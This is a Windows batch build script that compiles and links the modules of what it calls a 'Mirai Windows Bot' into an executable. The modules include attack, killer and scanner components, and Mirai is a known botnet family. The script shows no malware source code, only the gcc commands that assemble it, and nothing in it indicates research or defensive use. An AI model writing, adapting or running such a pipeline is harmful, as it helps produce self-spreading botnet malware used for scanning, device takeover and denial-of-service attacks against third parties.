@echo off
REM ============================================================================
REM Mirai Windows Bot - Complete Build Script
REM Compiles all bot modules and links into final executable
REM ============================================================================

echo ========================================
echo  Mirai Windows Bot Build System
echo ========================================
echo.

set SRC_DIR=mirai\bot
set BUILD_DIR=build\windows
set OUTPUT=mirai_bot.exe

REM Create build directory
if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"

echo [1/8] Compiling main_windows.c...
gcc -c "%SRC_DIR%\main_windows.c" -I"%SRC_DIR%" -DMIRAI_TELNET -o "%BUILD_DIR%\main_windows.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile main_windows.c
    goto :error
)

echo [2/8] Compiling attack_windows.c...
gcc -c "%SRC_DIR%\attack_windows.c" -I"%SRC_DIR%" -DMIRAI_TELNET -o "%BUILD_DIR%\attack_windows.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile attack_windows.c
    goto :error
)

echo [3/8] Compiling killer_windows.c...
gcc -c "%SRC_DIR%\killer_windows.c" -I"%SRC_DIR%" -DMIRAI_TELNET -o "%BUILD_DIR%\killer_windows.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile killer_windows.c
    goto :error
)

echo [4/8] Compiling scanner_windows.c...
gcc -c "%SRC_DIR%\scanner_windows.c" -I"%SRC_DIR%" -DMIRAI_TELNET -o "%BUILD_DIR%\scanner_windows.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile scanner_windows.c
    goto :error
)

echo [5/8] Compiling util.c...
gcc -c "%SRC_DIR%\util.c" -I"%SRC_DIR%" -o "%BUILD_DIR%\util.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile util.c
    goto :error
)

echo [6/8] Compiling table.c...
gcc -c "%SRC_DIR%\table.c" -I"%SRC_DIR%" -o "%BUILD_DIR%\table.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile table.c
    goto :error
)

echo [7/8] Compiling rand.c...
gcc -c "%SRC_DIR%\rand.c" -I"%SRC_DIR%" -o "%BUILD_DIR%\rand.o" 2>&1
if errorlevel 1 (
    echo ERROR: Failed to compile rand.c
    goto :error
)

echo [8/8] Linking final executable...
gcc "%BUILD_DIR%\main_windows.o" "%BUILD_DIR%\attack_windows.o" "%BUILD_DIR%\killer_windows.o" "%BUILD_DIR%\scanner_windows.o" "%BUILD_DIR%\util.o" "%BUILD_DIR%\table.o" "%BUILD_DIR%\rand.o" -o "%BUILD_DIR%\%OUTPUT%" -lws2_32 -liphlpapi 2>&1
if errorlevel 1 (
    echo ERROR: Failed to link executable
    goto :error
)

echo.
echo ========================================
echo  BUILD SUCCESSFUL!
echo ========================================
echo Output: %BUILD_DIR%\%OUTPUT%
echo.
dir "%BUILD_DIR%\%OUTPUT%"
echo.
goto :end

:error
echo.
echo ========================================
echo  BUILD FAILED!
echo ========================================
echo Please check the errors above.
pause
exit /b 1

:end
echo Build completed successfully!
pause
